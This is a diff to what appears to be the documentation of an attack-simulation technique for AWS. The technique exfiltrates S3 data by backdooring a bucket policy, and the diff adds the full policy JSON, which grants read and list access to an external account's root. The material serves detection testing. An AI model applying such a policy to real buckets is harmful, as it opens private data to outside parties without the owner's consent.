@@ -14,11 +14,40 @@ Platform: AWS
 ## Description
 
 
-Exfiltrates data from an S3 bucket by backdooring its bucket policy to allow access from an external AWS account.
+Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.
 
-Warm-up: Creates an S3 bucket.
+<span style="font-variant: small-caps;">Warm-up</span>: 
 
-Detonation: Backdoors the S3 bucket policy.
+- Create an S3 bucket.
+
+<span style="font-variant: small-caps;">Detonation</span>: 
+
+- Backdoor the S3 Bucket Policy by setting the following Bucket Policy:
+
+<pre>
+<code>
+{
+  "Version":"2012-10-17",
+  "Statement":[
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "AWS":"arn:aws:iam::193672423079:root"
+      },
+      "Action": [
+        "s3:GetObject",
+        "s3:GetBucketLocation",
+        "s3:ListBucket"
+      ],
+      "Resource": [
+        "arn:aws:s3:::%s/*",
+        "arn:aws:s3:::%s"
+      ]
+    }
+  ]
+}
+</code>
+</pre>
 
 
 ## Instructions
